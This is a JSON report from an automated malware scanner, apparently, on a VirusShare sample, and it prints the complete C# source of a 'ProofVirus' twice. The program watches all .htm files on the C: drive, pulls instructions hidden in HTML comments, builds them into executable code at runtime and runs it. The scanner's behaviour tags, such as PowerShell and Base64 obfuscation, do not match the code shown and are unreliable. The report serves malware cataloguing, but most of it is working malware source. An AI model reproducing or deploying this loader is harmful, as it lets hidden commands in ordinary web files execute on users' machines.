{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Command": "May run PowerShell commands",
            "System": "May run an executable file or a system command on a Mac",
            "Virtual": "May detect virtualization"
        },
        "macro": "using System;\nusing System.Threading;\nusing System.Reflection;\nusing System.Reflection.Emit;\nusing System.IO;\nusing System.Xml;\n\n\nnamespace ProofVirusCompiler\n{\t\n\tclass ProofVirusWriter\n\t{\n\t\tpublic static void Main() \n\t\t{\n\t\t\tFileSystemWatcher fsw = new FileSystemWatcher(\"c:\\\\\");\n\t\t\tfsw.Changed += new FileSystemEventHandler(Changed);\n\t\t\tfsw.Created += new FileSystemEventHandler(Created);\n\t\t\tfsw.IncludeSubdirectories = true;\n\t\t\tfsw.EnableRaisingEvents = true;\n\t\t\tfsw.Filter = \"*.htm\";\n\t\t\tint countChanges = 0;\n\t\t\twhile ( countChanges < 1 ) \n\t\t\t{\n\t\t\t\tfsw.WaitForChanged(WatcherChangeTypes.All);\n\t\t\t\tcountChanges++;\n\t\t\t}\n\n\t\t}\n\n\n\t\tpublic static void WriteAndExecute(string fname)\n\t\t{\n\n\t\t\t//----- Create assembly\n\t\t\tAssemblyName assemblyName = new AssemblyName();\n\t\t\tassemblyName.Name = \"ProofVirusAssembly\";\n\t\t\tAssemblyBuilder newAssembly = Thread.GetDomain().DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.RunAndSave);\n\t\t\t//----- Create a new module inside the assembly\n\t\t\tModuleBuilder newModule = newAssembly.DefineDynamicModule(\"ProofVirusModule\");\n\t\t\t//----- Create a new type inside the module\n\t\t\tTypeBuilder newType = newModule.DefineType(\"ProofVirus\", TypeAttributes.Public);\n\t\t\t//----- Create the method Execute\n\t\t\tType[] paramTypes = null;\n\t\t\tType retType = typeof(void);\n\t\t\tMethodBuilder newMethod = newType.DefineMethod(\"Execute\", \n\t\t\t\tMethodAttributes.Public | MethodAttributes.Virtual, retType, paramTypes);\n\t\t\t//----- Insert of the Command\n\t\t\tinsertCode(newMethod.GetILGenerator(), fname);\n\t\t\t//----- Close the new type\n\t\t\tnewType.CreateType();\n\t\t\t//----- Execute the created methode Execute\n\t\t\tMethodInfo method = newType.GetMethod(\"Execute\");\n\t\t\tobject obj = Activator.CreateInstance(newType);\n\t\t\tobject ret = method.Invoke(obj, null);\n\t\t\tConsole.WriteLine(ret);\n\t\t}\n\n\t\tpublic static void Created(object sender, FileSystemEventArgs args) {\n\t\t\tWriteAndExecute(args.FullPath);\n\t\t}\n\n\t\tpublic static void Changed(object sender, FileSystemEventArgs args) \n\t\t{\n\t\t\tWriteAndExecute(args.FullPath);\n\t\t}\n\n\t\tpublic static void insertCode(ILGenerator ilGen, string fname) \n\t\t{\n\t\t\tstring[] temp;\n\t\t\tConsole.WriteLine(\"Start Writing Virus from file \" + fname);\n\t\t\tXmlReader data = new XmlTextReader(fname);\n\t\t\twhile (data.Read()) \n\t\t\t{\n\n\t\t\t\tswitch (data.NodeType) \n\t\t\t\t{\n\t\t\t\t\tcase XmlNodeType.Comment:\n\t\t\t\t\t\ttemp = data.Value.Split(new Char[] {' '});\n\t\t\t\t\t\tif (temp!=null && temp.Length>0 && temp[0].Substring(0,3)==\"PV_\") \n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tanalyzeCommand(ilGen, temp);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tConsole.WriteLine(\"End Writing Virus\");\n\t\t}\n\n\t\tprivate static void analyzeCommand(ILGenerator ilGen, string[] str) \n\t\t{ \n\t\t\tif (str[0]==\"PV_Var\" ) {ilGen.DeclareLocal(Type.GetType(str[1]));}\n\t\t\telse if (str[0]==\"PV_Ldstr\") {ilGen.Emit(OpCodes.Ldstr, str[1]);}\n\t\t\telse if (str[0]==\"PV_Ldlen\") {ilGen.Emit(OpCodes.Ldlen); }\n\t\t\telse if (str[0]==\"PV_Ldarg_0\") {ilGen.Emit(OpCodes.Ldarg_0); }\n\t\t\telse if (str[0]==\"PV_Ldarg_1\") {ilGen.Emit(OpCodes.Ldarg_1); }\n\t\t\telse if (str[0]==\"PV_Ldarg_2\") {ilGen.Emit(OpCodes.Ldarg_2); }\n\t\t\telse if (str[0]==\"PV_Ldarg_3\") {ilGen.Emit(OpCodes.Ldarg_3); }\n\t\t\telse if (str[0]==\"PV_Ldarg_S\") {ilGen.Emit(OpCodes.Ldarg_S, Byte.Parse(str[1])); }\n\t\t\telse if (str[0]==\"PV_Stloc_0\") {ilGen.Emit(OpCodes.Stloc_0); }\n\t\t\telse if (str[0]==\"PV_Stloc_1\") {ilGen.Emit(OpCodes.Stloc_1); }\n\t\t\telse if (str[0]==\"PV_Stloc_2\") {ilGen.Emit(OpCodes.Stloc_2); }\n\t\t\telse if (str[0]==\"PV_Stloc_3\") {ilGen.Emit(OpCodes.Stloc_3); }\n\t\t\telse if (str[0]==\"PV_Stloc_S\") {ilGen.Emit(OpCodes.Stloc_S, Byte.Parse(str[1])); }\t\t\t\n\t\t\telse if (str[0]==\"PV_Ldloc_0\") {ilGen.Emit(OpCodes.Ldloc_0); }\n\t\t\telse if (str[0]==\"PV_Ldloc_1\") {ilGen.Emit(OpCodes.Ldloc_1); }\n\t\t\telse if (str[0]==\"PV_Ldloc_2\") {ilGen.Emit(OpCodes.Ldloc_2); }\n\t\t\telse if (str[0]==\"PV_Ldloc_3\") {ilGen.Emit(OpCodes.Ldloc_3); }\n\t\t\telse if (str[0]==\"PV_Ldloc_S\") {ilGen.Emit(OpCodes.Ldloc_S, Byte.Parse(str[1])); }\t\t\t\n\t\t\telse if (str[0]==\"PV_Ldc_0\") {ilGen.Emit(OpCodes.Ldc_I4_0); }\n\t\t\telse if (str[0]==\"PV_Ldc_1\") {ilGen.Emit(OpCodes.Ldc_I4_1); }\n\t\t\telse if (str[0]==\"PV_Ldc_M1\") {ilGen.Emit(OpCodes.Ldc_I4_M1); }\n\t\t\telse if (str[0]==\"PV_Ldc_S\") {ilGen.Emit(OpCodes.Ldc_I4_S, Byte.Parse(str[1])); }\t\t\t\n\t\t\telse if (str[0]==\"PV_Ldelem\") {ilGen.Emit(OpCodes.Ldelem_Ref); }\n\t\t\telse if (str[0]==\"PV_Ret\") { ilGen.Emit(OpCodes.Ret); }\n\t\t\telse if (str[0]==\"PV_Conv_i4\") { ilGen.Emit(OpCodes.Conv_I4); }\n\t\t\telse if (str[0]==\"PV_Add\") { ilGen.Emit(OpCodes.Add); }\n\t\t\telse if (str[0]==\"PV_Br\") { ilGen.Emit(OpCodes.Br_S, SByte.Parse(str[1]));}\n\t\t\telse if (str[0]==\"PV_Blt\") { ilGen.Emit(OpCodes.Blt_S, SByte.Parse(str[1]));}\n\t\t\telse if (str[0]==\"PV_Call\" || str[0]==\"PV_Callvirt\") \n\t\t\t{\n\t\t\t\tType t = null;\n\t\t\t\tType ClassType = null;\n\t\t\t\tType[] para = new Type[str.Length-3]; \n\t\t\t\tfor (int i=2;i<str.Length;i++) \n\t\t\t\t{\n\t\t\t\t\tif (i==2) ClassType = Type.GetType(str[i]); else para[i-3] = Type.GetType(str[i]);\n\t\t\t\t}\n\t\t\t\tMethodInfo mi = ClassType.GetMethod(str[1], para); \n\t\t\t\tif (str[0]==\"PV_Call\") ilGen.Emit(OpCodes.Call, mi); else ilGen.Emit(OpCodes.Callvirt, mi);\n\t\t\t}\n\t\t\telse \n\t\t\t{\n\t\t\t\tConsole.WriteLine(str[0] + \" not found\");\n\t\t\t}\n\t\t}\n\t}\n}"
    },
    "filename": "VirusShare_62068fa100c1e0617b9e47e93be6ccce",
    "filesize": 5276,
    "filetype": "C++ source, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "62068fa100c1e0617b9e47e93be6ccce",
        "sha1": "2e2cbd71bd33af325b620e703e68390cde40c653",
        "sha256": "038c6254caae23b97c935dbe3842042955551ffa1c58b7ea1e7aa3b6e8a16d26"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "using System;",
            "using System.Threading;",
            "using System.Reflection;",
            "using System.Reflection.Emit;",
            "using System.IO;",
            "using System.Xml;",
            "namespace ProofVirusCompiler",
            "\tclass ProofVirusWriter",
            "\t\tpublic static void Main() ",
            "\t\t\tFileSystemWatcher fsw = new FileSystemWatcher(\"c:\\\\\");",
            "\t\t\tfsw.Changed += new FileSystemEventHandler(Changed);",
            "\t\t\tfsw.Created += new FileSystemEventHandler(Created);",
            "\t\t\tfsw.IncludeSubdirectories = true;",
            "\t\t\tfsw.EnableRaisingEvents = true;",
            "\t\t\tfsw.Filter = \"*.htm\";",
            "\t\t\tint countChanges = 0;",
            "\t\t\twhile ( countChanges < 1 ) ",
            "\t\t\t{",
            "\t\t\t\tfsw.WaitForChanged(WatcherChangeTypes.All);",
            "\t\t\t\tcountChanges++;",
            "\t\t\t}",
            "\t\tpublic static void WriteAndExecute(string fname)",
            "\t\t\t//----- Create assembly",
            "\t\t\tAssemblyName assemblyName = new AssemblyName();",
            "\t\t\tassemblyName.Name = \"ProofVirusAssembly\";",
            "\t\t\tAssemblyBuilder newAssembly = Thread.GetDomain().DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.RunAndSave);",
            "\t\t\t//----- Create a new module inside the assembly",
            "\t\t\tModuleBuilder newModule = newAssembly.DefineDynamicModule(\"ProofVirusModule\");",
            "\t\t\t//----- Create a new type inside the module",
            "\t\t\tTypeBuilder newType = newModule.DefineType(\"ProofVirus\", TypeAttributes.Public);",
            "\t\t\t//----- Create the method Execute",
            "\t\t\tType[] paramTypes = null;",
            "\t\t\tType retType = typeof(void);",
            "\t\t\tMethodBuilder newMethod = newType.DefineMethod(\"Execute\", ",
            "\t\t\t\tMethodAttributes.Public | MethodAttributes.Virtual, retType, paramTypes);",
            "\t\t\t//----- Insert of the Command",
            "\t\t\tinsertCode(newMethod.GetILGenerator(), fname);",
            "\t\t\t//----- Close the new type",
            "\t\t\tnewType.CreateType();",
            "\t\t\t//----- Execute the created methode Execute",
            "\t\t\tMethodInfo method = newType.GetMethod(\"Execute\");",
            "\t\t\tobject obj = Activator.CreateInstance(newType);",
            "\t\t\tobject ret = method.Invoke(obj, null);",
            "\t\t\tConsole.WriteLine(ret);",
            "\t\tpublic static void Created(object sender, FileSystemEventArgs args) {",
            "\t\t\tWriteAndExecute(args.FullPath);",
            "\t\tpublic static void Changed(object sender, FileSystemEventArgs args) ",
            "\t\t\tWriteAndExecute(args.FullPath);",
            "\t\tpublic static void insertCode(ILGenerator ilGen, string fname) ",
            "\t\t\tstring[] temp;",
            "\t\t\tConsole.WriteLine(\"Start Writing Virus from file \" + fname);",
            "\t\t\tXmlReader data = new XmlTextReader(fname);",
            "\t\t\twhile (data.Read()) ",
            "\t\t\t{",
            "\t\t\t\tswitch (data.NodeType) ",
            "\t\t\t\t{",
            "\t\t\t\t\tcase XmlNodeType.Comment:",
            "\t\t\t\t\t\ttemp = data.Value.Split(new Char[] {' '});",
            "\t\t\t\t\t\tif (temp!=null && temp.Length>0 && temp[0].Substring(0,3)==\"PV_\") ",
            "\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\tanalyzeCommand(ilGen, temp);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tbreak;",
            "\t\t\t\t\tdefault:",
            "\t\t\t\t\t\tbreak;",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\tConsole.WriteLine(\"End Writing Virus\");",
            "\t\tprivate static void analyzeCommand(ILGenerator ilGen, string[] str) ",
            "\t\t{ ",
            "\t\t\tif (str[0]==\"PV_Var\" ) {ilGen.DeclareLocal(Type.GetType(str[1]));}",
            "\t\t\telse if (str[0]==\"PV_Ldstr\") {ilGen.Emit(OpCodes.Ldstr, str[1]);}",
            "\t\t\telse if (str[0]==\"PV_Ldlen\") {ilGen.Emit(OpCodes.Ldlen); }",
            "\t\t\telse if (str[0]==\"PV_Ldarg_0\") {ilGen.Emit(OpCodes.Ldarg_0); }",
            "\t\t\telse if (str[0]==\"PV_Ldarg_1\") {ilGen.Emit(OpCodes.Ldarg_1); }",
            "\t\t\telse if (str[0]==\"PV_Ldarg_2\") {ilGen.Emit(OpCodes.Ldarg_2); }",
            "\t\t\telse if (str[0]==\"PV_Ldarg_3\") {ilGen.Emit(OpCodes.Ldarg_3); }",
            "\t\t\telse if (str[0]==\"PV_Ldarg_S\") {ilGen.Emit(OpCodes.Ldarg_S, Byte.Parse(str[1])); }",
            "\t\t\telse if (str[0]==\"PV_Stloc_0\") {ilGen.Emit(OpCodes.Stloc_0); }",
            "\t\t\telse if (str[0]==\"PV_Stloc_1\") {ilGen.Emit(OpCodes.Stloc_1); }",
            "\t\t\telse if (str[0]==\"PV_Stloc_2\") {ilGen.Emit(OpCodes.Stloc_2); }",
            "\t\t\telse if (str[0]==\"PV_Stloc_3\") {ilGen.Emit(OpCodes.Stloc_3); }",
            "\t\t\telse if (str[0]==\"PV_Stloc_S\") {ilGen.Emit(OpCodes.Stloc_S, Byte.Parse(str[1])); }\t\t\t",
            "\t\t\telse if (str[0]==\"PV_Ldloc_0\") {ilGen.Emit(OpCodes.Ldloc_0); }",
            "\t\t\telse if (str[0]==\"PV_Ldloc_1\") {ilGen.Emit(OpCodes.Ldloc_1); }",
            "\t\t\telse if (str[0]==\"PV_Ldloc_2\") {ilGen.Emit(OpCodes.Ldloc_2); }",
            "\t\t\telse if (str[0]==\"PV_Ldloc_3\") {ilGen.Emit(OpCodes.Ldloc_3); }",
            "\t\t\telse if (str[0]==\"PV_Ldloc_S\") {ilGen.Emit(OpCodes.Ldloc_S, Byte.Parse(str[1])); }\t\t\t",
            "\t\t\telse if (str[0]==\"PV_Ldc_0\") {ilGen.Emit(OpCodes.Ldc_I4_0); }",
            "\t\t\telse if (str[0]==\"PV_Ldc_1\") {ilGen.Emit(OpCodes.Ldc_I4_1); }",
            "\t\t\telse if (str[0]==\"PV_Ldc_M1\") {ilGen.Emit(OpCodes.Ldc_I4_M1); }",
            "\t\t\telse if (str[0]==\"PV_Ldc_S\") {ilGen.Emit(OpCodes.Ldc_I4_S, Byte.Parse(str[1])); }\t\t\t",
            "\t\t\telse if (str[0]==\"PV_Ldelem\") {ilGen.Emit(OpCodes.Ldelem_Ref); }",
            "\t\t\telse if (str[0]==\"PV_Ret\") { ilGen.Emit(OpCodes.Ret); }",
            "\t\t\telse if (str[0]==\"PV_Conv_i4\") { ilGen.Emit(OpCodes.Conv_I4); }",
            "\t\t\telse if (str[0]==\"PV_Add\") { ilGen.Emit(OpCodes.Add); }",
            "\t\t\telse if (str[0]==\"PV_Br\") { ilGen.Emit(OpCodes.Br_S, SByte.Parse(str[1]));}",
            "\t\t\telse if (str[0]==\"PV_Blt\") { ilGen.Emit(OpCodes.Blt_S, SByte.Parse(str[1]));}",
            "\t\t\telse if (str[0]==\"PV_Call\" || str[0]==\"PV_Callvirt\") ",
            "\t\t\t{",
            "\t\t\t\tType t = null;",
            "\t\t\t\tType ClassType = null;",
            "\t\t\t\tType[] para = new Type[str.Length-3]; ",
            "\t\t\t\tfor (int i=2;i<str.Length;i++) ",
            "\t\t\t\t{",
            "\t\t\t\t\tif (i==2) ClassType = Type.GetType(str[i]); else para[i-3] = Type.GetType(str[i]);",
            "\t\t\t\t}",
            "\t\t\t\tMethodInfo mi = ClassType.GetMethod(str[1], para); ",
            "\t\t\t\tif (str[0]==\"PV_Call\") ilGen.Emit(OpCodes.Call, mi); else ilGen.Emit(OpCodes.Callvirt, mi);",
            "\t\t\t}",
            "\t\t\telse ",
            "\t\t\t{",
            "\t\t\t\tConsole.WriteLine(str[0] + \" not found\");",
            "\t\t\t}"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.290702",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
